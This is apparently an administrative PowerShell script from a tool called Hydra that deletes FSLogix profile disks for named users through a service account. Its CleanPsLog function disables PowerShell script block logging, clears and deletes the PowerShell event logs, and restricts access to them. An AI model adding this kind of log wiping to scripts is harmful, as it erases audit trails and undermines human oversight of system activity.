# This powershell script is part of Hydra
# Current Version of this script: 5.3
# {"Name": "Delete FSLogix user profile","Description":"Delete the FSLogix profile of the given user. The user must be logged off and the share accessible by the given service account"}
param(
    [string]$paramLogFileName="AVD.DeleteFSLogixProfile.log",
   	[string]$users="",
    [string]$serviceDomainUser64="",
    [string]$serviceDomainPw64=""
);

# Define logfile and dir
$LogDir="$env:windir\system32\logfiles"
$LogFile="$LogDir\$paramLogFileName"
$ErrorActionPreference="stop"


$global:messages=""
function LogWriter($message)
{
    $global:messages+="`r`n"+$message
    $message="$(Get-Date ([datetime]::UtcNow) -Format "o") $message"
	write-host($message)
	if ([System.IO.Directory]::Exists($LogDir)) { try { write-output($message) | Out-File $LogFile -Append } catch {} }
}
function AddRegistyKey($key) {
	if (-not (Test-Path $key)) {
		New-Item -Path $key -Force -ErrorAction SilentlyContinue
	}
}
function Decrypt-String ($encryptedString, $passPhrase) {
    try {
        $data = [Convert]::FromBase64String($encryptedString)
        $key  = [Convert]::FromBase64String($passPhrase)
        $iv   = $data[0..15]
        $ct   = $data[16..($data.Length - 1)]
        $aes = [System.Security.Cryptography.Aes]::Create()
        $aes.Mode = 'CBC'; $aes.Key = $key; $aes.IV = $iv
        $cs = New-Object System.Security.Cryptography.CryptoStream (([IO.MemoryStream]::new($ct)),$aes.CreateDecryptor(),'Read')
        return ([IO.StreamReader]::new($cs)).ReadToEnd()
    } catch {
        return $encryptedString
    }
}
function RemoveCryptoKey($path) {
	LogWriter("Remove CryptoKey")
    try {
        (gc $path) | ForEach-Object {
            if ($_ -like '*####CryptoKeySet####*' -and $_ -like '*$CryptoKey=*' -and ($_ -notlike '*-and*')) {
                '#' * $_.Length
            } else {
                $_
            }
        } | sc $path -Encoding UTF8
		$name = Split-Path $path -Leaf
		$dir  = Split-Path $path -Parent
		if ($path -like 'C:\Packages\Plugins\*\Downloads\*' -and $name -like 'script*.ps1') {
			RemoveReadOnlyFromScripts $path
			$settingsPath="$(([System.IO.DirectoryInfo]::new($path).Parent.Parent.FullName))\RuntimeSettings\$(($name -split '\.')[0] -replace '[^\d]', '').settings"
			if (Test-Path -Path $settingsPath) {try {""|sc $settingsPath -Encoding UTF8 -ErrorAction stop} catch{}}
		}
		if ($path -like 'C:\Packages\Plugins\*\Downloads\*') {
			$aclNew=New-Object Security.AccessControl.DirectorySecurity
			$aclNew.SetSecurityDescriptorSddlForm("O:SY G:SY D:(A;OICI;FA;;;SY)(A;OICI;FA;;;BA)")
			$aclNew.SetAccessRuleProtection($true, $false)
			Set-Acl -Path ([System.IO.DirectoryInfo]::new($path).Parent.Parent.FullName) -AclObject $aclNew -ErrorAction Stop
		}
    } catch {
		LogWriter("Remove CryptoKey cause an exception: $_")
	}
}
function RemoveReadOnlyFromScripts($path){
    try {
		if ($path -like 'C:\Packages\Plugins\*\Downloads\*') {
			$dir  = Split-Path $path -Parent
			Get-ChildItem $dir -Filter 'script*.ps1' -File | ForEach-Object {
				if ($_.Attributes -band 'ReadOnly') { $_.Attributes = $_.Attributes -bxor 'ReadOnly' }
			}
		}
    } catch {
        LogWriter("Remove ReadOnly from scripts caused an issue: $_")
    }
}
function CleanPsLog() {
	AddRegistyKey "HKLM:\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging"
	New-ItemProperty -Path "HKLM:\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -Name "EnableScriptBlockLogging" -Value 0 -force -ErrorAction SilentlyContinue
    try {Disable-PSTrace} catch {}
	try {
		try {$l1 = New-Object System.Diagnostics.Eventing.Reader.EventLogConfiguration "Windows PowerShell"} catch {$l1=$null}
		try {$l2 = New-Object System.Diagnostics.Eventing.Reader.EventLogConfiguration "Microsoft-Windows-PowerShell/Operational"} catch {$l2=$null}
		Clear-EventLog -LogName "Windows PowerShell" -ErrorAction SilentlyContinue
		Start-Process -FilePath "$env:windir\system32\wevtutil.exe" -ArgumentList 'cl "Microsoft-Windows-PowerShell/Operational"' -Wait -ErrorAction SilentlyContinue
		try {$l2.IsEnabled=$false;$l2.SaveChanges()} catch {throw $_}
		#Change permission
		Start-Process -FilePath "$env:windir\system32\wevtutil.exe" -ArgumentList 'sl "Windows PowerShell" /ca:"O:SYG:SYD:(A;;0x1;;;SY)"' -Wait -ErrorAction SilentlyContinue
		Start-Process -FilePath "$env:windir\system32\wevtutil.exe" -ArgumentList 'sl "Microsoft-Windows-PowerShell/Operational" /ca:"O:SYG:SYD:(A;;0x1;;;SY)"' -Wait -ErrorAction SilentlyContinue
		$cleanIt=$false
		try {
		if ($l1.SecurityDescriptor -ne "O:SYG:SYD:(A;;0x1;;;SY)" -or $l2.SecurityDescriptor -ne "O:SYG:SYD:(A;;0x1;;;SY)" -or $l2.IsEnabled -or (Test-Path -Path "$($l2.LogFilePath.Replace("%SystemRoot%",$env:windir))") -or (Get-WinEvent -LogName $l1.LogName -MaxEvents 1 -ErrorAction SilentlyContinue) -or (Get-WinEvent -LogName $l2.LogName -MaxEvents 1 -ErrorAction SilentlyContinue)) {
			$cleanIt=$true
			LogWriter("CleanPsLog check is true")
		}
		} catch {
			$cleanIt=$true
			LogWriter("CleanPsLog caused an issue while checking the log configuration: $_")
		}
		if ($cleanIt){
			LogWriter("CleanPsLog clean-up files")
			Stop-Service -Name EventLog -Force -ErrorAction SilentlyContinue
			Remove-Item "$($l1.LogFilePath.Replace("%SystemRoot%",$env:windir))" -Force -ErrorAction SilentlyContinue
			Remove-Item "$($l2.LogFilePath.Replace("%SystemRoot%",$env:windir))" -Force -ErrorAction SilentlyContinue
			Start-Service -Name EventLog -ErrorAction SilentlyContinue
		}
	} catch {
			LogWriter("CleanPsLog caused an issue: $_")
	}
}
function ResolveEnvVariable($stringValue)
{
    # based on https://jdhitsolutions.com/blog/powershell/2425/friday-fun-expand-environmental-variables-in-powershell-strings/
    if ($stringValue -match "%\S+%") {
        $newValue=""
        $values=$stringValue.split("%") | Where {$_}
        foreach ($text in $values) {
            [string]$replace=(Get-Item env:$text -ErrorAction SilentlyContinue).Value
            if ($replace) {
                $newValue+=$replace
            }
            else {
                $newValue+=$text
            }
        }
        return $newValue    
    }
    return $stringValue
}

CleanPsLog
LogWriter("Remove FSLogix profile script starts. Parameter: $($users)")

####CryptoKey####
if ($CryptoKey) {RemoveCryptoKey "$($MyInvocation.MyCommand.Path)"} else {RemoveReadOnlyFromScripts "$($MyInvocation.MyCommand.Path)"}

if ($CryptoKey) {
    LogWriter("Decrypting parameters")
	if ($serviceDomainUser64) { $serviceDomainUser64 = Decrypt-String $serviceDomainUser64 $CryptoKey }
	if ($serviceDomainPw64) { $serviceDomainPw64 = Decrypt-String $serviceDomainPw64 $CryptoKey }
}

# set serviceDomainCredentials
$serviceDomainUser=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($serviceDomainUser64))
$serviceDomainPw=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($serviceDomainPw64))


$profilePath=Get-ItemPropertyValue -Path HKLM:\SOFTWARE\FSLogix\Profiles -Name VHDLocations
if ($profilePath -eq $null) {
    throw "VHDLocations is not set on the host (FSLogix configuration)"
}

try {
    LogWriter("Pre-authentication: Using service account to authenticate to the file share silently")
    $psc = New-Object System.Management.Automation.PSCredential("$serviceDomainUser", (ConvertTo-SecureString "$serviceDomainPw" -AsPlainText -Force))
    New-PSDrive -Name Profile -PSProvider FileSystem -Root "$profilePath" -Credential $psc -ErrorAction Stop   
} catch {
    LogWriter("Pre-authentication failed or was not nessessary. Return message: $_")
}

foreach ($user in $users.Split(";")) {
    if ($user -ne "") {
        try {
            $user=$user.Trim()
            LogWriter("Processing: $user")
            $search = [adsisearcher]"(&(ObjectCategory=Person)(ObjectClass=User)(|(userprincipalname=$user)(cn=$user)))"
            try {
                $adUser = $search.FindOne()
            } catch {
                LogWriter("Cannot browse Active Directory. Will try with Entra Id only account and random SID: $_.Message")
            }
            


            if ($adUser) {
                $sid=(New-Object System.Security.Principal.SecurityIdentifier([byte[]]($adUser.Properties.objectsid |out-string -Stream),0)).Value
                $samaccountname=$adUser.Properties.samaccountname
                LogWriter("User found in Active Directory: $($adUser.Path) with SID $sid")
            } else { 
                $sid="S-1-12-?-*-*-*-*"
                $uparts=$user.Split("@")
                if ($uparts.Count -eq 2) {
					$samaccountname=$uparts[0]
				} else {
					$samaccountname=$user
				}
                LogWriter("Active Directory not available. We assume a cloud only identity: $($samaccountname) with SID $sid")
            }

            # Test for custom naming
            $dirName=(Get-Item -Path HKLM:\SOFTWARE\FSLogix\Profiles -ErrorAction SilentlyContinue).GetValue("SIDDirNameMatch")
            $noProfileContainingFolder=(Get-Item -Path HKLM:\SOFTWARE\FSLogix\Profiles -ErrorAction SilentlyContinue).GetValue("NoProfileContainingFolder")
            if ($noProfileContainingFolder -ne $null -and $noProfileContainingFolder -eq "1") {
                LogWriter("NoProfileContainingFolder is set to 1")
                $profilePathUser=$profilePath
            } else {
                if ($dirName -eq $null -or $dirName -eq "") {
                    $regPath1="HKLM:\Software\FSLogix\Profiles"
                    $regPath2="HKLM:\Software\Policies\FSLogix\ODFC"
                    $flipFlop=$false
                                        
                    if ((Test-Path $regPath1) -and (Get-Item $regPath1 -ErrorAction SilentlyContinue).GetValue("FlipFlopProfileDirectoryName") -eq 1) {$flipFlop=$true}
                    if ((Test-Path $regPath2) -and (Get-Item $regPath2 -ErrorAction SilentlyContinue).GetValue("FlipFlopProfileDirectoryName") -eq 1) {$flipFlop=$true}
                    if ($flipFlop) {
                        $profilePathUser="$($profilePath)\$($samaccountname)_$($sid)"
                        LogWriter("FlipFlopProfileDirectoryName is set to 1")
                    } else  {
                        $profilePathUser="$($profilePath)\$($sid)_$($samaccountname)"
                        LogWriter("FlipFlopProfileDirectoryName is set to 0")
                    }
                } else {
                    $profilePathUser="$($profilePath)\$dirName"
                }
            }
            $env:userName=$samaccountname
            $profilePathUser=ResolveEnvVariable($profilePathUser)

            LogWriter("Default FSLogix profile path is: $profilePathUser")
            if (!(Test-Path -Path "$profilePath" -ErrorAction SilentlyContinue)) {
                LogWriter("Using service account to authenticate to the file share")
                $psc = New-Object System.Management.Automation.PSCredential("$serviceDomainUser", (ConvertTo-SecureString "$serviceDomainPw" -AsPlainText -Force))
                New-PSDrive -Name Profile -PSProvider FileSystem -Root "$profilePath" -Credential $psc -ErrorAction SilentlyContinue
            }
            if (-not (Test-Path $profilePathUser)) {
                throw "The path $profilePathUser doesn't exist"
            }
            LogWriter("Start to remove all files in the path")
            $files=Get-ChildItem -Path "$profilePathUser\*" -Include *.vhd* -Depth 1 -Force | Where { ! $_.PSIsContainer }
            LogWriter("Found $($files.count) file(s) in directory")
            if  ($files.count -eq 0) {
                LogWriter("ERROR: No files found in $profilePathUser")
            }
            $files | Remove-Item -Force -Confirm:$false
            LogWriter("Done")

        } catch {
            LogWriter("ERROR: An exception occurs: $_.Message")
        }
    }
}

CleanPsLog
# use the next line to give a return message
Write-host("ScriptReturnMessage:{$($global:messages)}:ScriptReturnMessage")
